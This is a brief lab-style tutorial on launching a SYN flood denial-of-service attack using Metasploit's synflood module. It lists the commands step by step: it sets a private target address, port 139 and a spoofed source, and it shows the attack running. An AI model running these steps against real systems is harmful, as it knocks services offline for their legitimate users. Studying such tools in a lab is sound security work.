## Deniel of Service Attack [metasploit]

<img src="https://www.kali.org/tools/metasploit-framework/images/metasploit-framework-logo.svg" style="width:120px;"/>

The Metasploit Framework is an open source platform that supports vulnerability research, exploit development, and the creation of custom security tools.


A SYN flood (half-open attack) is a type of denial-of-service (DDoS) attack which aims to make a server unavailable to legitimate traffic by consuming all available server resources. By repeatedly sending initial connection request (SYN) packets

--

1- Start Metasploit framework `sudo msfconsole`

2- import synflood package `use dos/tcp/synflood`

3- show current options `options`
```
msf6 auxiliary(dos/tcp/synflood) > options

Module options (auxiliary/dos/tcp/synflood):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   NUM                         no        Number of SYNs to send (else unlimited)
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
                                         loit/basics/using-metasploit.html
   RPORT      80               yes       The target port
   SHOST                       no        The spoofable source address (else randomizes)
   SNAPLEN    65535            yes       The number of bytes to capture
   SPORT                       no        The source port (else randomizes)
   TIMEOUT    500              yes       The number of seconds to wait for new data


View the full module info with the info, or info -d command.
```

4- set target host `set RHOSTS 192.168.70.6`

5- set target port `set RPORT 139`

6- set spoofed host `set SHOST 192.168.70.4`

7- start the attack `run` (cancel with ctrl+c)

```
[*] Running module against 192.168.70.6

[*] SYN flooding 192.168.70.6:139...
```
